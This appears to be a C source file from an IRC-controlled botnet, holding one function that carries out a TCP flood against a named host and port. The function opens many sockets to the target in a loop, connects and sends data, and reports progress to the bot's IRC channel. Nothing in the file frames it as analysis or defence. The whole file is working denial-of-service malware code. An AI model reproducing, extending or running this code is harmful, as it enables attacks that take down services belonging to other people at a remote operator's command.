#include "includes.h"
#include "externs.h"

DWORD WINAPI XTcpFloodThread(LPVOID lpParam)
{
	TCPFLOODTHREAD thread = *((TCPFLOODTHREAD *)lpParam);
	TCPFLOODTHREAD *xinfo = (TCPFLOODTHREAD *)lpParam;
	xinfo->Gotit = TRUE;

	//free(lpParam);



	SOCKADDR_IN    sin;
	SOCKET *sock = NULL;

	XWStartup();

	sock =  (SOCKET *)XHeapAlloc((thread.MaxSockets + sizeof(SOCKET)) * sizeof(SOCKET));


	memset(&sin, 0, sizeof(sin));
	sin.sin_family = AF_INET;

	if (!thread.RemotePort)
		sin.sin_port = htons((short)rand()%65535);
	else
   		sin.sin_port = htons(thread.RemotePort);

	sin.sin_addr.S_un.S_addr = inet_addr(XResolveHost2(thread.RemoteHost));

 	DWORD mode = 1, sent = 0, times = 0;
	int c = 0;

	// huge mem leak here :(

	XIRCMessage(thread.Session.irc->sock, TRUE, thread.Session.Notice, thread.Session.Silent, thread.Session.Destination, "[TCPFLOOD]: Flooding %s:%d for %d times with delay of %dms and %d sockets", thread.RemoteHost, thread.RemotePort, thread.Times, thread.Delay, thread.MaxSockets);

	DWORD start = GetTickCount();

	do
	{
		for (c = 0; c < thread.MaxSockets; c++)
		{
			sent++;
			*(sock+c) = XSocket();
			if BAD_SOCKET(*(sock+c))
			{
				break;
			}

		}
			
		for (c = 0; c < thread.MaxSockets; c++)
		{
  			if (connect(*(sock+c), (PSOCKADDR)&sin, sizeof(sin)) == SOCKET_ERROR)
			{
				break;
			}
		}

      	Sleep(thread.Delay*10000);
				
		for (c = 0; c < thread.MaxSockets; c++) // replace < to <=
		{
			if (thread.Data)
				send(*(sock+c), thread.Data, strlen(thread.Data), 0);

			closesocket(*(sock+c)); //close all sockets
		}
		times++;
		
	} while (times < thread.Times); // < to <=

	for (c = 0; c < thread.MaxSockets; c++)
		closesocket(*(sock+c));

	DWORD stop = GetTickCount();

	XHeapFree(sock);

	XIRCMessage(thread.Session.irc->sock, TRUE, thread.Session.Notice, thread.Session.Silent, thread.Session.Destination, "[TCPFLOOD]: Finished flooding %s:%d, %d packet(s) sent (~%luMB) (~%luKB/s)", thread.RemoteHost, thread.RemotePort, sent, sent / 1024, (sent / ((stop-start)/1000))+1);

	XKillThread(thread.Threadnum, TRUE , FALSE);

	memset(&thread, 0, sizeof(thread));

	ExitThread(0);

}
